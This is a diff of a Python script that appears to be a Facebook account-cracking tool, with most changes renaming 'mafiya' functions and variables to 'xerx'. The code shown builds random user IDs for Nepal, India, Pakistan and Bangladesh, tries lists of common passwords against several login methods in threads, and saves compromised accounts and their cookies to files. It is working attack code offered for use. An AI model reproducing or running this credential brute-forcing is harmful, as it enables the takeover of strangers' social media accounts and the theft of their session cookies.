@@ -1228,20 +1228,20 @@ def follow(ses,coki):
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
     
     		
-def mafiya():
+def xerx():
     os.system("clear")
     print(logo)
     
     print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
     print(49*'=')
-    tom = input("✓CHOOSE>")
-    if tom =='1':mafiya1()
-    elif tom =='2':mafiya2()
-    elif tom =='3':mafiya3()
-    elif tom =='4':mafiya4()
-    elif tom =='5': mafiya5()
-    elif tom =='6':mafiya6()
-    elif tom =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100066332015845")
+    aryan = input("✓CHOOSE>")
+    if aryan =='1':xerx1()
+    elif aryan =='2':xerx2()
+    elif aryan =='3':xerx3()
+    elif aryan =='4':xerx4()
+    elif aryan =='5':xerx5()
+    elif aryan =='6':xerx6()
+    elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100066332015845")
     else:
         print("SELECT CORRECT OPTION")
         xerx()
@@ -1264,23 +1264,23 @@ def xerx1():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	mafiyafire = input("[+] [CHOOSE] :- ")
+	xerxfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	mafiyalovesyou = input("[+] [CHOOSE] :- ")
-	if mafiyalovesyou in ['y','Y','1','yes','YES','Yes']:
-	mafiya_xd.append('y')
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
 	else:
-		mafiya_xd.append('n')
+		xerx_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	mafiyatop = input("[+] [CHOOSE] :- ")
-	if mafiyatop in ['y','Y','Yes','YES','1']:
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1295,12 +1295,12 @@ def xerx1():
 		for guru in user:
 			uid = kode+guru
 			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
-			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
-			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
-			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
+			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1309,7 +1309,7 @@ def xerx1():
 	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 	print('[?] Ids saved in MAFIYA-OK.txt, MAFIYA-CP.txt')
 	input("DO YOU WANT TO GO BACK MENU ")
-	mafiya()
+	xerx()
 	print(47*"-")
 	
 	
@@ -1317,7 +1317,7 @@ def xerx1():
 
 
 
-def mafiya2():
+def xerx2():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1335,23 +1335,23 @@ def mafiya2():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	mafiyafire = input("[+] [CHOOSE] :- ")
+	xerxfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	mafiyalovesyou = input("[+] [CHOOSE] :- ")
-	if mafiyalovesyou in ['y','Y','1','yes','YES','Yes']:
-		mafiya_xd.append('y')
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
 	else:
-		mafiya_xd.append('n')
+		xerx_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	mafiyatop = input("[+] [CHOOSE] :- ")
-	if mafiyatop in ['y','Y','Yes','YES','1']:
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1368,12 +1368,12 @@ def mafiya2():
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
-			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
-			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
+			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1383,7 +1383,7 @@ def mafiya2():
 	print(47*"-")
 
 
-def mafiya3():
+def xerx3():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1401,23 +1401,23 @@ def mafiya3():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	mafiyafire = input("[+] [CHOOSE] :- ")
+	xerxfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	mafiyalovesyou = input("[+] [CHOOSE] :- ")
-	if mafiyalovesyou in ['y','Y','1','yes','YES','Yes']:
-		mafiya_xd.append('y')
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
 	else:
-		mafiya_xd.append('n')
+		xerx_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	mafiyatop = input("[+] [CHOOSE] :- ")
-	if mafiyatop in ['y','Y','Yes','YES','1']:
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1434,12 +1434,12 @@ def mafiya3():
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
-			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
-			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
-			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
+			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1454,7 +1454,7 @@ def mafiya3():
 	print(47*"-")
 
 
-def mafiya4():
+def xerx4():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1472,23 +1472,23 @@ def mafiya4():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	mafiyafire = input("[+] [CHOOSE] :- ")
+	xerxfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	mafiyalovesyou = input("[+] [CHOOSE] :- ")
-	if mafiyalovesyou in ['y','Y','1','yes','YES','Yes']:
-		mafiya_xd.append('y')
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
 	else:
-		mafiya_xd.append('n')
+		xerx_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	mafiyatop = input("[+] [CHOOSE] :- ")
-	if mafiyatop in ['y','Y','Yes','YES','1']:
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1505,12 +1505,12 @@ def mafiya4():
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'bangladesh','Bangladesh','free fire','Free Fire','i love you','freefire123']
-			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
-			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
-			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
+			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1522,7 +1522,7 @@ def mafiya4():
 
 
 
-def mafiya5():
+def xerx5():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1548,23 +1548,23 @@ def mafiya5():
 	print(49*'=')
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	mafiyafire = input("[+] [CHOOSE] :- ")
+	xerxfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	mafiyalovesyou = input("[+] [CHOOSE] :- ")
-	if mafiyalovesyou in ['y','Y','1','yes','YES','Yes']:
-		mafiya_xd.append('y')
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
 	else:
-		mafiya_xd.append('n')
+		xerx_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	mafiyatop = input("[+] [CHOOSE] :- ")
-	if mafiyatop in ['y','Y','Yes','YES','1']:
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1582,19 +1582,19 @@ def mafiya5():
 			uid = code+love
 			for Eman in HamiiID:
 				pwx.append(Eman)
-			if mafiyafire =='1':manshera.submit(mbasic,uid,pwx,tl)
-			elif mafiyafire =='2':manshera.submit(p,uid,pwx,tl)
-			elif mafiyafire =='3':manshera.submit(x,uid,pwx,tl)
-			elif mafiyafire =='4':manshera.submit(mobile,uid,pwx,tl)
-			elif mafiyafire =='5':manshera.submit(freeq,uid,pwx,tl)
-			elif mafiyafire =='6':manshera.submit(d,uid,pwx,tl)
+			if xerxfire =='1':manshera.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':manshera.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':manshera.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':manshera.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':manshera.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':manshera.submit(d,uid,pwx,tl)
 			else:
 			    manshera.submit(p,uid,pwx,tl)
 			
 
 
 
-def mafiya6():
+def xerx6():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1612,23 +1612,23 @@ def mafiya6():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	mafiyafire = input("[+] [CHOOSE] :- ")
+	xerxfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	mafiyalovesyou = input("[+] [CHOOSE] :- ")
-	if mafiyalovesyou in ['y','Y','1','yes','YES','Yes']:
-		mafiya_xd.append('y')
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
 	else:
-		mafiya_xd.append('n')
+		xerx_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	mafiyatop = input("[+] [CHOOSE] :- ")
-	if mafiyatop in ['y','Y','Yes','YES','1']:
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1645,12 +1645,12 @@ def mafiya6():
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
-			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
-			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
+			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -2149,4 +2149,4 @@ def d(uid,pwx,tl):
 	except:
 		pass
 
-mafiya()
+xerx()
